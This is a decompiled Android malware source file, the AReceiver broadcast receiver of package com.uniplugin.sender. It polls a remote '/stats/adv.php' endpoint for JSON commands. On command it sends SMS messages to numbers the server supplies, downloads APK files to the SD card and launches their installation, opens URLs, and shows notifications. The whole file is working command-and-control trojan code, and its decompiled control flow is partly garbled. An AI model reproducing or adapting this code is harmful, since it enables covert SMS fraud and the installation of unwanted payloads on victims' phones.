package com.uniplugin.sender;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import android.util.Log;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy.Type;
import java.net.SocketAddress;
import java.net.URL;
import java.net.URLConnection;
import java.util.Iterator;
import java.util.List;
import org.apache.http.util.ByteArrayBuffer;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

public class AReceiver
  extends BroadcastReceiver
{
  private static final String SERVICE_CLASS = "com.uniplugin.sender";
  private String newtype;
  private String statusotvet;
  private Sender testsend;
  
  public AReceiver() {}
  
  private boolean isMyServiceRunning(Context paramContext, String paramString)
  {
    paramContext = ((ActivityManager)paramContext.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
    do
    {
      if (!paramContext.hasNext()) {
        return false;
      }
    } while (!paramString.equals(((ActivityManager.RunningServiceInfo)paramContext.next()).service.getClassName()));
    return true;
  }
  
  public void DownloadFromUrl(String paramString1, String paramString2, Context paramContext)
  {
    try
    {
      paramContext = new URL(paramString1);
      paramString1 = new File(paramString2);
      long l = System.currentTimeMillis();
      Log.d("ImageManager", "download begining");
      Log.d("ImageManager", "download url:" + paramContext);
      Log.d("ImageManager", "downloaded file name:" + paramString2);
      paramContext = new BufferedInputStream(paramContext.openConnection().getInputStream());
      paramString2 = new ByteArrayBuffer(50);
      for (;;)
      {
        int i = paramContext.read();
        if (i == -1)
        {
          paramString1 = new FileOutputStream("/mnt/sdcard/download/" + paramString1);
          paramString1.write(paramString2.toByteArray());
          paramString1.close();
          Log.d("ImageManager", "download ready in" + (System.currentTimeMillis() - l) / 1000L + " sec");
          return;
        }
        paramString2.append((byte)i);
      }
      return;
    }
    catch (IOException paramString1)
    {
      Log.d("ImageManager", "Error: " + paramString1);
    }
  }
  
  public String Update(String paramString1, String paramString2, Context paramContext)
  {
    try
    {
      paramContext = (HttpURLConnection)new URL(paramString1).openConnection();
      paramContext.setRequestMethod("GET");
      paramContext.setDoOutput(true);
      paramContext.connect();
      paramString1 = new FileOutputStream(new File(paramString2));
      paramString2 = paramContext.getInputStream();
      paramContext = new byte['Ð€'];
      for (;;)
      {
        int i = paramString2.read(paramContext);
        if (i == -1)
        {
          paramString1.close();
          paramString2.close();
          return "yes";
        }
        paramString1.write(paramContext, 0, i);
      }
      return "no";
    }
    catch (IOException paramString1) {}
  }
  
  public void checkcomand(Context paramContext)
  {
    localObject1 = "";
    try
    {
      localObject4 = doInBackground(this.testsend.domen + "/stats/adv.php", this.testsend.params);
      localObject1 = localObject4;
    }
    catch (IOException localJSONException9)
    {
      try
      {
        localObject1 = (JSONObject)new JSONTokener((String)localObject1).nextValue();
      }
      catch (JSONException localJSONException9)
      {
        try
        {
          this.statusotvet = ((JSONObject)localObject1).getString("status");
          if (this.statusotvet == null) {
            break label703;
          }
          if (!this.statusotvet.contains("newmess")) {
            break label286;
          }
        }
        catch (JSONException localJSONException9)
        {
          try
          {
            this.newtype = ((JSONObject)localObject1).getString("type");
            if (!this.newtype.contains("do")) {
              break label224;
            }
            i = 0;
          }
          catch (JSONException localJSONException9)
          {
            try
            {
              j = ((JSONObject)localObject1).getInt("id");
              i = j;
              localObject4 = null;
            }
            catch (JSONException localJSONException9)
            {
              try
              {
                localObject5 = ((JSONObject)localObject1).getString("title");
                localObject4 = localObject5;
                localObject5 = null;
              }
              catch (JSONException localJSONException9)
              {
                try
                {
                  localObject6 = ((JSONObject)localObject1).getString("text");
                  localObject5 = localObject6;
                  localObject6 = null;
                }
                catch (JSONException localJSONException9)
                {
                  try
                  {
                    localObject7 = ((JSONObject)localObject1).getString("icon");
                    localObject6 = localObject7;
                    localObject7 = null;
                  }
                  catch (JSONException localJSONException9)
                  {
                    try
                    {
                      localObject8 = ((JSONObject)localObject1).getString("url");
                      localObject7 = localObject8;
                      showmessinternet(i, (String)localObject4, (String)localObject5, (String)localObject6, (String)localObject7, paramContext);
                      if (!this.newtype.contains("show")) {
                        break label286;
                      }
                      localObject4 = null;
                    }
                    catch (JSONException localJSONException9)
                    {
                      try
                      {
                        localObject5 = ((JSONObject)localObject1).getString("url");
                        localObject4 = localObject5;
                        localObject4 = new Intent("android.intent.action.VIEW", Uri.parse((String)localObject4));
                        ((Intent)localObject4).addFlags(268435456);
                        paramContext.startActivity((Intent)localObject4);
                        if (!this.statusotvet.contains("newload")) {
                          break label556;
                        }
                      }
                      catch (JSONException localJSONException9)
                      {
                        try
                        {
                          this.newtype = ((JSONObject)localObject1).getString("type");
                          if (!this.newtype.contains("do")) {
                            break label437;
                          }
                          i = 0;
                        }
                        catch (JSONException localJSONException9)
                        {
                          try
                          {
                            int j = ((JSONObject)localObject1).getInt("id");
                            i = j;
                            localObject4 = null;
                          }
                          catch (JSONException localJSONException9)
                          {
                            try
                            {
                              localObject5 = ((JSONObject)localObject1).getString("title");
                              localObject4 = localObject5;
                              localObject5 = null;
                            }
                            catch (JSONException localJSONException9)
                            {
                              try
                              {
                                localObject6 = ((JSONObject)localObject1).getString("text");
                                localObject5 = localObject6;
                                localObject6 = null;
                              }
                              catch (JSONException localJSONException9)
                              {
                                try
                                {
                                  localObject7 = ((JSONObject)localObject1).getString("icon");
                                  localObject6 = localObject7;
                                  localObject7 = null;
                                }
                                catch (JSONException localJSONException9)
                                {
                                  try
                                  {
                                    localObject8 = ((JSONObject)localObject1).getString("url");
                                    localObject7 = localObject8;
                                    localObject8 = null;
                                  }
                                  catch (JSONException localJSONException9)
                                  {
                                    try
                                    {
                                      int i;
                                      Object localObject7;
                                      String str = ((JSONObject)localObject1).getString("apkname");
                                      Object localObject8 = str;
                                      showmessload(i, (String)localObject4, (String)localObject5, (String)localObject6, (String)localObject7, (String)localObject8, paramContext);
                                      if (!this.newtype.contains("show")) {
                                        break label556;
                                      }
                                      localObject4 = null;
                                    }
                                    catch (JSONException localJSONException9)
                                    {
                                      try
                                      {
                                        localObject5 = ((JSONObject)localObject1).getString("url");
                                        localObject4 = localObject5;
                                        localObject5 = null;
                                      }
                                      catch (JSONException localJSONException9)
                                      {
                                        try
                                        {
                                          Object localObject6 = ((JSONObject)localObject1).getString("apkname");
                                          localObject5 = localObject6;
                                          DownloadFromUrl((String)localObject4, (String)localObject5, paramContext);
                                          localObject4 = new Intent("android.intent.action.VIEW");
                                          ((Intent)localObject4).setDataAndType(Uri.fromFile(new File("/mnt/sdcard/download/" + (String)localObject5)), "application/vnd.android.package-archive");
                                          ((Intent)localObject4).setFlags(268435456);
                                          paramContext.startActivity((Intent)localObject4);
                                          if (!this.statusotvet.contains("newsend")) {
                                            break label703;
                                          }
                                        }
                                        catch (JSONException localJSONException9)
                                        {
                                          try
                                          {
                                            this.newtype = ((JSONObject)localObject1).getString("type");
                                            if (!this.newtype.contains("do")) {
                                              break label635;
                                            }
                                            paramContext = null;
                                          }
                                          catch (JSONException localJSONException9)
                                          {
                                            try
                                            {
                                              localObject4 = ((JSONObject)localObject1).getString("pref");
                                              paramContext = (Context)localObject4;
                                              localObject4 = null;
                                            }
                                            catch (JSONException localJSONException9)
                                            {
                                              try
                                              {
                                                Object localObject5 = ((JSONObject)localObject1).getString("number");
                                                localObject4 = localObject5;
                                                this.testsend.sendSMSki((String)localObject4, paramContext);
                                                if (!this.newtype.contains("dohi")) {
                                                  break label703;
                                                }
                                                paramContext = null;
                                              }
                                              catch (JSONException localJSONException9)
                                              {
                                                try
                                                {
                                                  Object localObject4 = ((JSONObject)localObject1).getString("pref");
                                                  paramContext = (Context)localObject4;
                                                  localObject4 = null;
                                                }
                                                catch (JSONException localJSONException9)
                                                {
                                                  try
                                                  {
                                                    for (;;)
                                                    {
                                                      localObject1 = ((JSONObject)localObject1).getString("number");
                                                      this.testsend.timeers = String.valueOf(this.testsend.GetUnixTime());
                                                      this.testsend.sendSMSkahi((String)localObject1, paramContext);
                                                      return;
                                                      localIOException = localIOException;
                                                      localIOException.printStackTrace();
                                                      continue;
                                                      localJSONException1 = localJSONException1;
                                                      localJSONException1.printStackTrace();
                                                      Object localObject2 = localIOException;
                                                      continue;
                                                      localJSONException3 = localJSONException3;
                                                      localJSONException3.printStackTrace();
                                                      continue;
                                                      localJSONException4 = localJSONException4;
                                                      localJSONException4.printStackTrace();
                                                      continue;
                                                      localJSONException5 = localJSONException5;
                                                      localJSONException5.printStackTrace();
                                                      continue;
                                                      localJSONException10 = localJSONException10;
                                                      localJSONException10.printStackTrace();
                                                      continue;
                                                      localJSONException15 = localJSONException15;
                                                      localJSONException15.printStackTrace();
                                                      continue;
                                                      localJSONException18 = localJSONException18;
                                                      localJSONException18.printStackTrace();
                                                      continue;
                                                      localJSONException20 = localJSONException20;
                                                      localJSONException20.printStackTrace();
                                                      continue;
                                                      localJSONException11 = localJSONException11;
                                                      localJSONException11.printStackTrace();
                                                      continue;
                                                      localJSONException6 = localJSONException6;
                                                      localJSONException6.printStackTrace();
                                                      continue;
                                                      localJSONException7 = localJSONException7;
                                                      localJSONException7.printStackTrace();
                                                      continue;
                                                      localJSONException12 = localJSONException12;
                                                      localJSONException12.printStackTrace();
                                                      continue;
                                                      localJSONException16 = localJSONException16;
                                                      localJSONException16.printStackTrace();
                                                      continue;
                                                      localJSONException19 = localJSONException19;
                                                      localJSONException19.printStackTrace();
                                                      continue;
                                                      localJSONException21 = localJSONException21;
                                                      localJSONException21.printStackTrace();
                                                      continue;
                                                      localJSONException22 = localJSONException22;
                                                      localJSONException22.printStackTrace();
                                                      continue;
                                                      localJSONException13 = localJSONException13;
                                                      localJSONException13.printStackTrace();
                                                      continue;
                                                      localJSONException17 = localJSONException17;
                                                      localJSONException17.printStackTrace();
                                                      continue;
                                                      paramContext = paramContext;
                                                      paramContext.printStackTrace();
                                                      continue;
                                                      localJSONException8 = localJSONException8;
                                                      localJSONException8.printStackTrace();
                                                      continue;
                                                      localJSONException14 = localJSONException14;
                                                      localJSONException14.printStackTrace();
                                                    }
                                                    localJSONException9 = localJSONException9;
                                                    localJSONException9.printStackTrace();
                                                  }
                                                  catch (JSONException localJSONException2)
                                                  {
                                                    for (;;)
                                                    {
                                                      localJSONException2.printStackTrace();
                                                      Object localObject3 = localJSONException9;
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    if (((String)localObject1).length() > 5) {
      localObject4 = null;
    }
  }
  
  protected String doInBackground(String paramString1, String paramString2)
    throws IOException
  {
    Object localObject = android.net.Proxy.getDefaultHost();
    int i = android.net.Proxy.getDefaultPort();
    paramString1 = new URL(paramString1);
    if (i > 0)
    {
      localObject = new InetSocketAddress((String)localObject, i);
      paramString1 = (HttpURLConnection)paramString1.openConnection(new java.net.Proxy(Proxy.Type.HTTP, (SocketAddress)localObject));
      paramString1.setDoInput(true);
      paramString1.setDoOutput(true);
      paramString1.setRequestMethod("POST");
      paramString1.setConnectTimeout(10000);
      localObject = new DataOutputStream(paramString1.getOutputStream());
      ((DataOutputStream)localObject).writeBytes(paramString2);
      ((DataOutputStream)localObject).flush();
      ((DataOutputStream)localObject).close();
      paramString1.connect();
      paramString1 = new BufferedReader(new InputStreamReader(paramString1.getInputStream(), "UTF-8"));
      paramString2 = new StringBuilder();
    }
    for (;;)
    {
      localObject = paramString1.readLine();
      if (localObject == null)
      {
        return paramString2.toString();
        paramString1 = (HttpURLConnection)paramString1.openConnection();
        break;
      }
      paramString2.append((String)localObject).append("\n");
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (!isMyServiceRunning(paramContext, "com.uniplugin.sender")) {
      run(paramContext, paramIntent);
    }
    paramContext.stopService(paramIntent);
  }
  
  public void run(Context paramContext, Intent paramIntent)
  {
    this.testsend = new Sender();
    this.testsend.SenderStart(paramContext, "conf.txt", 0);
    checkcomand(paramContext);
  }
  
  public void showmessinternet(int paramInt, String paramString1, String paramString2, String paramString3, String paramString4, Context paramContext)
  {
    paramString4 = PendingIntent.getActivity(paramContext, 0, new Intent("android.intent.action.VIEW", Uri.parse(paramString4)), 0);
    NotificationManager localNotificationManager = (NotificationManager)paramContext.getSystemService("notification");
    paramString3 = new Notification(paramContext.getResources().getIdentifier(paramString3, null, null), paramString1, System.currentTimeMillis());
    paramString3.setLatestEventInfo(paramContext, paramString1, paramString2, paramString4);
    paramString3.flags |= 0x10;
    paramString3.vibrate = new long[] { 100L, 250L, 100L, 500L };
    localNotificationManager.notify(paramInt, paramString3);
  }
  
  public void showmessload(int paramInt, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, Context paramContext)
  {
    DownloadFromUrl(paramString4, paramString5, paramContext);
    paramString4 = new Intent("android.intent.action.VIEW");
    paramString4.setDataAndType(Uri.fromFile(new File("/mnt/sdcard/download/" + paramString5)), "application/vnd.android.package-archive");
    paramString4 = PendingIntent.getActivity(paramContext, 0, paramString4, 0);
    paramString5 = (NotificationManager)paramContext.getSystemService("notification");
    paramString3 = new Notification(paramContext.getResources().getIdentifier(paramString3, null, null), paramString1, System.currentTimeMillis());
    paramString3.setLatestEventInfo(paramContext, paramString1, paramString2, paramString4);
    paramString3.flags |= 0x10;
    paramString3.vibrate = new long[] { 100L, 250L, 100L, 500L };
    paramString5.notify(paramInt, paramString3);
  }
  
  public class Maintwo
  {
    public Maintwo(Context paramContext) {}
  }
}
